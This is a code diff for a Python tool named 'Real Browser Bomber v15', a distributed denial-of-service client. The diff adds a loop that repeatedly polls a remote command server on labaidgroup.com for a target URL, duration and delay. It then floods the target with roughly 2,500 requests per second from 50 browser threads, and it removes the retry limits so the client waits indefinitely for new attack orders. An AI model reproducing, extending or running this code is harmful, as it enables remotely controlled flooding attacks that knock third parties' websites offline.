@@ -10,8 +10,7 @@ init(autoreset=True)
 API_URL = "https://labaidgroup.com/files/google_security2025992852991526.php"
 THREADS = 50
 RPS_PER_THREAD = 50.0
-RETRY_LIMIT = 3
-RETRY_DELAY = 1
+RETRY_DELAY = 5
 
 class Stats:
     def __init__(self): self.t = self.e = 0; self.c = {}; self.l = threading.Lock()
@@ -28,8 +27,7 @@ def signal_handler(signum, frame):
     raise KeyboardInterrupt
 
 def fetch_config():
-    attempt = 0
-    while attempt < RETRY_LIMIT:
+    while True:
         try:
             req = urllib.request.Request(
                 API_URL,
@@ -47,36 +45,32 @@ def fetch_config():
                 raw = resp.read().decode('utf-8', errors='ignore').strip()
             
             if not raw or '<data>' not in raw:
-                raise ValueError("Invalid or empty response")
-
-            print(f"{Fore.CYAN}Raw XML: {raw[:200]}{'...' if len(raw) > 200 else ''}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Waiting for valid data... (empty/invalid response){Style.RESET_ALL}")
+                time.sleep(RETRY_DELAY)
+                continue
 
             root = ET.fromstring(raw)
             url_elem = root.find('url')
             time_elem = root.find('time')
+            wait_elem = root.find('wait')
 
             if url_elem is None or time_elem is None:
-                raise ValueError("Missing <url> or <time>")
+                print(f"{Fore.YELLOW}Waiting for valid data... (missing fields){Style.RESET_ALL}")
+                time.sleep(RETRY_DELAY)
+                continue
 
             url = url_elem.text.strip() if url_elem.text else ""
             if not url.startswith("http"):
                 url = "https://" + url
             dur = int(time_elem.text.strip())
+            wait = int(wait_elem.text.strip()) if wait_elem and wait_elem.text else 0
 
-            return url, dur
+            print(f"{Fore.GREEN}New attack received: {url} | Duration: {dur}s | Wait: {wait}s{Style.RESET_ALL}")
+            return url, dur, wait
 
-        except ET.ParseError as e:
-            print(f"{Fore.RED}XML Parse Error (Attempt {attempt + 1}): {e}")
-            print(f"{Fore.RED}Raw: {raw if 'raw' in locals() else 'N/A'}{Style.RESET_ALL}")
         except Exception as e:
-            print(f"{Fore.RED}Fetch failed (Attempt {attempt + 1}): {e}")
-        
-        attempt += 1
-        if attempt < RETRY_LIMIT:
+            print(f"{Fore.YELLOW}API error: {e} | Retrying in {RETRY_DELAY}s...{Style.RESET_ALL}")
             time.sleep(RETRY_DELAY)
-
-    print(f"{Fore.RED}Failed to fetch config after {RETRY_LIMIT} attempts{Style.RESET_ALL}")
-    sys.exit(1)
 
 def worker(tid, url, dur, stats, stop, last, target_rps):
     browser = None
@@ -158,39 +152,37 @@ def worker(tid, url, dur, stats, stop, last, target_rps):
             if browser: browser.close()
         except: pass
 
-def main():
-    URL, DUR = fetch_config()
+def run_attack(url, dur, wait_time):
+    print(f"{Fore.CYAN}Waiting {wait_time}s before attack...{Style.RESET_ALL}")
+    time.sleep(wait_time)
+
     stats = Stats()
     stop = threading.Event()
     last = ["---"]
     st = time.time()
 
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
     total_rps = THREADS * RPS_PER_THREAD
-    print(f"{Fore.GREEN}{Style.BRIGHT}Target: {URL}")
-    print(f"{Fore.YELLOW}Duration: {DUR}s | Browsers: {THREADS} | RPS/Browser: {RPS_PER_THREAD}")
-    print(f"{Fore.CYAN}Total: ~{total_rps:.1f} RPS | Auto-config from API")
+    print(f"{Fore.GREEN}{Style.BRIGHT}ATTACK STARTED → {url}")
+    print(f"{Fore.YELLOW}Duration: {dur}s | Browsers: {THREADS} | RPS/Browser: {RPS_PER_THREAD} → ~{total_rps:.1f} RPS")
     print("="*80)
 
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
-        futures = [ex.submit(worker, i, URL, DUR, stats, stop, last, RPS_PER_THREAD) for i in range(THREADS)]
+        futures = [ex.submit(worker, i, url, dur, stats, stop, last, RPS_PER_THREAD) for i in range(THREADS)]
 
         try:
-            while any(f.running() for f in futures) and time.time() - st < DUR:
+            while any(f.running() for f in futures) and time.time() - st < dur:
                 el = int(time.time() - st)
                 t, e, c = stats.get()
                 rate = t / max(el, 1)
-                prog = min(el/DUR, 1)
-                bar = "█"*int(30*prog) + "░"*(30-int(30*prog))
+                prog = min(el/dur, 1)
+                bar = "Full"*int(30*prog) + "Empty"*(30-int(30*prog))
                 col = Fore.CYAN if last[0] in ["200","301"] else Fore.RED
                 print(f"\r{Fore.WHITE}[{el:2d}s] {Fore.CYAN}{bar} {prog*100:5.1f}% | "
                       f"{Fore.YELLOW}Req: {t:5d} | {Fore.RED}Err: {e:3d} | "
                       f"{Fore.GREEN}Rate: {rate:6.1f}/s | Last: {col}{last[0]}{Style.RESET_ALL}", end="", flush=True)
                 time.sleep(0.5)
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}Stopping all browsers...{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}Stopping attack...{Style.RESET_ALL}")
             stop.set()
             time.sleep(1)
 
@@ -198,11 +190,24 @@ def main():
     t, e, c = stats.get()
     success = (t-e)/t*100 if t > 0 else 0
     print("\n" + "="*80)
-    print(f"{Fore.GREEN}{Style.BRIGHT}Finished in {final:.1f}s")
+    print(f"{Fore.GREEN}{Style.BRIGHT}ATTACK FINISHED in {final:.1f}s")
     print(f"{Fore.YELLOW}Total: {t} | Errors: {e} | Success: {success:.1f}%")
     print(f"{Fore.MAGENTA}Avg Rate: {t/final:.2f} req/s")
     if c: print(f"{Fore.WHITE}Codes: {' | '.join([f'{k}:{v}' for k,v in c.items()])}")
     print("="*80)
+
+def main():
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    print(f"{Fore.CYAN}{Style.BRIGHT}Real Browser Bomber v15 – API Loop Mode")
+    print(f"{Fore.YELLOW}Waiting for attack commands from API...{Style.RESET_ALL}")
+    print("="*80)
+
+    while True:
+        url, dur, wait_time = fetch_config()
+        run_attack(url, dur, wait_time)
+        print(f"{Fore.YELLOW}Attack completed. Waiting for next command...{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
